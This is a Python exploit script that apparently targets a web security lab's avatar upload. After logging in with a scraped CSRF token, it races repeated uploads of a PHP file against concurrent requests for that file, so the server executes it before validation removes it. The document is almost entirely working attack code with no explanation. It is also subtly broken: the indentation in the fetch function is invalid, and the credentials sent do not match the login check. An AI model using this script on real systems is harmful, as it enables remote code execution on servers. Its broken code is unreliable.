#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup
import threading

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

s = requests.Session()

def get_csrf():
    url = "https://<domain.name>/login"
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    value = soup.find('input', {'name': 'csrf'}).get('value')
    return value

def get_login():
    csrf = get_csrf()
    url = "https://<domain.name>/login"
    data = {'csrf': csrf, 'username': 'test', 'password': 'test123'}
    r = s.post(url=url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "wiener" in res:
        print("[+] Login Successfully...")
        soup = BeautifulSoup(res, 'html.parser')
        csrf = soup.find('input', {'name': 'csrf'}).get('value')
        name = soup.find('input', {'name': 'user'}).get('value')
        return csrf, name

def upload_file():
    values = get_login()
    csrf = values[0]
    name = values[1]
    for i in range(10):
        url1 = "https://<domain.name>/my-account/avatar"
        files = {'avatar': open('123.php','rb')}
        data = {'user': name, 'csrf': csrf}
        r = s.post(url1, files=files, data=data, verify=False, allow_redirects=False)

def get_file():
    for x in range(10):
        url2 = "https://<domain.name>/files/avatars/123.php"
        req = s.get(url2, verify=False)
        res = req.text
            if 'Bader ' in res:
                print(res)
		break

thread1 = threading.Thread(target=upload_file)
thread1.start()

thread2 = threading.Thread(target=get_file)
thread2.start()
